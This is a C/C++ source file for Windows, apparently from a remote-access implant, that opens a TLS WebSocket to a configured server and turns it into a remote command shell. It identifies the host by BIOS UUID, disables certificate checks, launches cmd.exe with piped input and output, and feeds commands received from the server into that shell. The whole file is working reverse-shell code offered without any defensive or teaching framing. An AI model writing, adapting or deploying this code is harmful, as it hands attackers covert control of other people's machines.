#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************/
INT reverse_shell_callback(struct lws* socket, enum lws_callback_reasons reason, PVOID user, PVOID in, SIZE_T len)
{
	WebSocketData* wsData = (WebSocketData*)user;
	CHAR buf[LWS_PRE + BUFSIZE] = { 0 };

	printf("reason = %d\n", reason);

	switch (reason)
	{
	case LWS_CALLBACK_CLIENT_ESTABLISHED:

		if (!CreatePipes(wsData))
		{
			printf("Failed to CreatePipes\n");
			return -1;
		}

		printf("[+] - Pipes are create\n");

		if (!CreateChildProcess(L"C:\\Windows\\System32\\cmd.exe", wsData))
		{
			printf("Failed to create child process\n");
			return -1;
		}

		printf("[+] - Child process is now create\n");

		wsData->hThreadReadStdout = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadStdoutProc, wsData, 0, NULL);
		wsData->hThreadReadStderr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadStderrProc, wsData, 0, NULL);
		break;
		case LWS_CALLBACK_CLIENT_RECEIVE:
		//lwsl_user("Message from the server: %s \n", in);
		lwsl_user("COMMAND RECEIVE: %s \n", in);

		//sprintf_s((void*)buf, sizeof(buf), "%.*s\n",(int)len, (char*)in);
		sprintf_s(buf, sizeof(buf), "%.*s\n", (int)len, (char*)in);
		if (WriteToPipe(buf, wsData->hChildStd_Input_Wr) == FALSE)
		{
			printf("Failed to write on pipe\n");
		}
		break;

	case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
		lwsl_err("CLIENT_CONNECTION_ERROR: %s\n", in ? (char*)in : "(null)");
		return -1;
		break;

	case LWS_CALLBACK_CLIENT_CLOSED:
		printf("WSDATA = %p\n", wsData);
		if (wsData->hThreadReadStdout)
		{
			BOOL ret = TerminateThread(wsData->hThreadReadStdout, 0);
			printf("Thread Read Stdout ended: GetLastError(%d)\n", GetLastError());
		}
		if (wsData->hThreadReadStderr)
		{
			BOOL ret = TerminateThread(wsData->hThreadReadStderr, 0);
			printf("Thread Read Stderr ended: GetLastError(%d)\n", GetLastError());
		}
		if (wsData->hCmdProcess)
		{
			BOOL ret = TerminateProcess(wsData->hCmdProcess, 0);
			printf("Process ended: GetLastError(%d)\n", GetLastError());
		}

		del_node(&listWebSockets, index_of_node(listWebSockets.head, node_of_data(listWebSockets.head, user)));
		return -1;
		break;
	}

	return 0;
}
/********************************************************************************************************************************/
// Make the connection with the server
BOOL WebSocketConnection()
{
	Node* node = add_node(&listWebSockets);
	if (!node)
		return FALSE;
	init_node_data(node, sizeof(WebSocketData));
	WebSocketData* wsData = (WebSocketData*)node->data;

	struct lws_context_creation_info ctxInfo = { 0 };
	ctxInfo.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
	ctxInfo.port = CONTEXT_PORT_NO_LISTEN;
	ctxInfo.protocols = protocols;

	if (!(wsData->context = lws_create_context(&ctxInfo)))
	{
		lwsl_err("lws init failed\n");
		return FALSE;
	}

	CHAR path[URL_SIZE] = { 0 };
	CHAR uuid[INFORMATION_SIZE] = { 0 };
	GetInformation(uuid, sizeof(uuid), BIOS_UUID);
	if (StringCbPrintfA(path, sizeof(path), "%s?%s", REVERSE_SHELL_WS_A, uuid) != S_OK)
		return FALSE;

	struct lws_client_connect_info connectInfo = { 0 };

	connectInfo.context = wsData->context;
	connectInfo.address = SERVER_NAME_A;
	connectInfo.port = 443;
	connectInfo.path = path;
	connectInfo.host = connectInfo.address;
	connectInfo.origin = connectInfo.address;
	connectInfo.protocol = protocols[0].name;
	connectInfo.ssl_connection = LCCSCF_USE_SSL | LCCSCF_ALLOW_SELFSIGNED | LCCSCF_ALLOW_INSECURE | LCCSCF_SKIP_SERVER_CERT_HOSTNAME_CHECK;
	connectInfo.pwsi = &wsData->socket;
	connectInfo.userdata = wsData;
	lws_client_connect_via_info(&connectInfo);

	for (INT i = 0; i >= 0; )
	{
		if (node == NULL)
			break;
		i = lws_service(wsData->context, 0);
		printf("%d\n", i);
	}

	lws_context_destroy(wsData->context);

	lwsl_user("Completed\n");

	return TRUE;
}
/********************************************************************************************************************************/

EXTERN_C_END